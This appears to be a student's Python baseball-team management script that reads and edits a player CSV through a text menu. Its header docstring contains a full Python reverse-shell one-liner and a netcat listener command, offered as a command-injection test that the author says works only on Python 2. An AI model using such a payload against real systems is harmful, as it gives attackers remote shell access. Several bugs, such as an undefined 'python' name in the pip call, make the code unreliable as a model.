#! /usr/bin/python3

# Harbor Higginbotham
# Time Assesment: 2 Hours
# Difficulty: Easy
# Date Started: 07/16/2023
# Wrote all this code for the last asignment but never tested it bcause I was too lazy to add the list in.
# Well lazy means scared of the posible run time errors since I wrote 200 lines with out running
# All worked fist try except for display.....

"""
[%] By: NoughtHarbor [%]
* All.. Well most user inputs are susceptible to CMD injection.
Rev shell to try if you want to test it. 
- Run this on sep cmd thread - nc -nlvp 1234
- CMD to Inject - ")) import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); #

*** Correction attempting to cmd inject input() does not work on python 3 but it does in python 2... 
"""


import sys # Used to check if prettytable is and installed module
import subprocess # Used to check if prettytable is and installed module
import pkg_resources # Used to check if prettytable is and installed module
from prettytable import PrettyTable # For Function Display 
from FileIO import *
 

"""
###### Function Check_Input(List, User_Input) ######
Pre_Condition:
- An array is passed in the fucntion param 'List'.
- 'User_Input' does not cause a value error. 

Post_Condition:
- Returns True if 'User_Input' is found in 'List'.
- Else, False. 

Params:
- 'List' is an array.
- 'User_Input' must be a string value. 
"""
def Check_Input(List, User_Input):
	for x in List:
		if User_Input == x:
			return True
	return False

"""
###### Funtion Disaply(List) ######
Pre_Conditions:
- User has the prettytable lib installed
- File "./player.csv" is read successfully by FileIO.Read_List()
- A dicitonary is passed in the function param 'List'. 

Post_Conditions:
- Returns a table of data associated with in the file "./player.csv"

Params:
- 'List' Must be a list of dictionaries. 
"""
def Display(List):
	# Var Dec:
	Index = 1
	Table = PrettyTable(["", "Player", "Pos", "AB", "H", "AVG"]) # Create Header

	# Add Rows:
	for x in List:
		Table.add_row([Index, x["name"], x["position"], x["at_bats"], x["hits"], round(float(x["hits"])/float(x["at_bats"]), 3)])
		Index+=1 

	# Console Output:
	print(Table)

"""
###### Add_Player(List) ######
Pre_Conditions:
- File "./player.csv" is read successfully by FileIO.Read_List()
- User Choose's option associated with this functions call in main. 

Post_Conditions: 
- File "./player.csv" is updated with new list with values filled with user input.
- List stored in the stack is updated with the return call. Old list gone due to auto mem trash compactor. 

Params:
- 'List' must be a list of dictionaries.
"""
def Add_Payer(List):
	# Var Dec:
	Valid = ("C", "1B", "2B", "3B", "SS", "LF", "CF", "RF", "P")

	try:
		# User Input
		Name = str(input("[&] Name: "))
		Posistion = str(input("[&] Position: "))
		Bats = int(input("[&] At Bats: "))
		Hits = int(input("[&] Hits: "))

	except ValueError as Err:
		print("+"*64)
		print(f"[&] Input Failed - Invalid Option: {Name}/{Posistion}/{Bats}/{Hits}\n[&] Error: {Err}")

	else:
		# User Input Final - Linear Search O(N):
		if Check_Input(Valid, Posistion) == False:
			print(f"[&] Position input invalid: {Posistion} \n[&] Please input: {Valid}")
		else:
			# Add to list.
			List.append({'name' : Name, "position":Posistion, "at_bats":Bats, "hits":Hits}) 
			Write_List(List)
			print("[&] List Updated! ")

		return List

"""
###### Function Del_Player(List) ######
Pre_Conditions:
- File "./player.csv" is read successfully by FileIO.Read_List()
- User Choose's option associated with this functions call in main. 

Post_Conditions:
- Dictionary is removed from list of dictionaries. 
- List stored in the stack is updated with the return call. Old list gone due to auto mem trash compactor. 

Params:
- 'List' must be a list of dictionaries.
"""
def Del_Player(List):
	# User Input
	try:
		User = int(input(f"[&] Enter a current lineup number to Delete - Options: 1 - {len(List)}\n"))

	except ValueError as Err:
			print("+"*64)
			print(f"[&] Input Failed - Invalid Option: {User}\n[&] Error: {Err}")

	else:
		# User Input Validation:
		if User > len(List)-1 or User == 0 or User < 0:
			print(f"[&] Lineup # out of range... \n[&] Please choose between 1 and {len(List)}")

		# Successful user input, edit list:
		else: 
			# Delete Dict, Update Store File. 
			print(f"[&] Deleting {List[User - 1]['name']}")
			del List[User - 1] # No loop for Uin Failure, Sorry... 
			Write_List(List)
			return List 


def Mv_Player(List):
	pass
"""
###### Function Edit_Posistion(List) ######
Pre_Conditions:
- File "./player.csv" is read successfully by FileIO.Read_List()
- User Choose's option associated with this functions call in main. 

Post_Conditions:
- File "./player.csv" is updated with new list with values filled with user input.
- Position of user choosen player is changed
- List stored in the stack is updated with the return call. Old list gone due to auto mem trash compactor. 

Params:
- 'List' must be a list of dictionaries.
"""
def Edit_Posistion(List):
	# Var Dec:
	Valid = ("C", "1B", "2B", "3B", "SS", "LF", "CF", "RF", "P")
	Loop = True

	# Fucntion Menu:
	while(Loop):
		try:
			# User input
			LineUp = int(input(f"[&] Enter a lineup number to edit - Options: 1 - {len(List)}\n"))
			Posistion = str(input(f"[&] Enter a new position - Options: {Valid}\n"))

		except ValueError as Err:
			print("+"*64)
			print(f"[&] Input Failed - Invalid Option: {Posistion}/{LineUp}\n[&] Error: {Err}")

		else:
			# User Input Validation - Index in Range:
			if LineUp > len(List) or LineUp == 0:
				print(f"[&] Lineup # out of range... \n[&] Please choose between 1 and {len(List)}\n[&] Possition Entered {Posistion}")

			# User Input Validation - Linear Search O(N):
			elif Check_Input(Valid, Posistion) == False:
				print(f"[&] Position input invalid: {Posistion} \n[&] Please input: C, 1B, 2B, 3B, SS, LF, CF, RF, P")

			# Successful user input, edit list:
			else:
				# Update Position, update store file, Return: 
				List[LineUp - 1]["position"] = Posistion
				Write_List(List)
				print(f"[&] Position updated! for {List[LineUp - 1]['name']}")
				return List		

"""
###### Function Edit_Stats(List) ######
Pre_Conditions:
- File "./player.csv" is read successfully by FileIO.Read_List()
- User Choose's option associated with this functions call in main. 

Post_Conditions:
- File "./player.csv" is updated with new list with values filled with user input.
- List stored in the stack is updated with the return call. Old list gone due to auto mem trash compactor. 

Params:
- 'List' must be a list of dictionaries.
"""
def Edit_Stats(List):
	# Var Dec:
	Loop = True
	Input_Name_Check = False
	Index = 0

	# Fucntion Menu:
	while(Loop):
		try:
			# User input
			Name = str(input("[&] Name: "))
			Bats = int(input("[&] At Bats: "))
			Hits = int(input("[&] Hits: "))

		except ValueError as Err:
			print("+"*64)
			print(f"[&] Input Failed - Invalid Option: {Name}/{Bats}/{Hits}\n[&] Error: {Err}")

		else:
			# Name Check - Linear Search O(N):
			for x in List:
				if Name != x['name']:
					Index += 1
				else:
					Input_Name_Check = True
					break

			# User Input Validation:
			if Input_Name_Check == False:
				print(f"[&] Name Not Found...")

			# Successful user input, edit list:
			else:
				# Update Stats, file, & Return: 
				List[Index]["at_bats"] = Bats
				List[Index]["hits"] = Hits
				print(f"[&] Bats and Hits Upated for {List[Index]['name']}")
				Write_List(List)
				return List		


def main():
	# Var Dec:
	Loop = True
	PlayerList = Read_List()
	print("+"*64)
	print("\t    [&] Baseball Team Management Program [&] ")
	
	while(Loop):
		# Menue: 
		print("""
MENU OPTIONS
[&] 1 – Display lineup
[&] 2 – Add player
[&] 3 – Remove player
[&] 4 – Move player
[&] 5 – Edit player position
[&] 6 – Edit player stats
[&] 7 - Exit program

POSITIONS
[&] C, 1B, 2B, 3B, SS, LF, CF, RF, P [&]""")

		# User Input:
		try:
			User_Input = int(input("\n[&] Menu Option: "))

		except ValueError as Err:
			print("+"*64)
			print(f"[&] Input Failed - Invalid Option: {User_Input} \n[&] Error: {Err}")

		else:
			# Menu Options Function Call:
			if User_Input == 1: # Display - Should be off with those tabs I counted them at 4 spaces but it was way more. 
				Display(PlayerList)

			elif User_Input == 2: # Add Player
				PlayerList = Add_Payer(PlayerList)

			elif User_Input == 3: # Remove Player 
				PlayerList = Del_Player(PlayerList)

			elif User_Input == 4: # Move Player - In the Works 
				PlayerList = Mv_Player(PlayerList)

			elif User_Input == 5:# Edit Position 
				PlayerList = Edit_Posistion(PlayerList)

			elif User_Input == 6: # Edit Stats 
				PlayerList = Edit_Stats(PlayerList)

			elif User_Input == 7: # Exit
				print("Bye!")
				Loop = False

			else:
				print(f"User Input Invalid: {User_Input}")

if __name__ == '__main__':
	# Check for Required Modules and ask if user wants to install... 
	# Source - https://stackoverflow.com/questions/44210656/how-to-check-if-a-module-is-installed-in-python-and-if-not-install-it-within-t
	# Man I miss bash.... 

	# Var Dec
	Reqs = {"prettytable"}
	Installed_Mods = {pkg.key for pkg in pkg_resources.working_set} 
	Missing = Reqs - Installed_Mods # ooooo Fuck a linear search!

	if Missing: # Whoa very pythonic 
		try:
			Uin = str(input(f"[&] Missing Packages {Missing}\n[&] Would you like to install? [y/n] "))
		except ValueError as Err:
			print(f"[&] Input Failed - Invalid Option: {User_Input} \n[&] Error: {Err}")
		else:
			if Uin == "y" or Uin == "Y":
				subprocess.check_call([python, '-m', 'pip', 'install', *Missing], stdout=subprocess.DEVNULL)
				print(f"[&] {Missing} Installed... Re-feed interpreter")
			else:
				print("Manualy run 'python3 -m pip install prettytable'")
				print("yOu CaNt DoC pOiNtS If I gAvE aN OpTiOn?\nidk man the project needed some spice sorry")

	else:
		main()




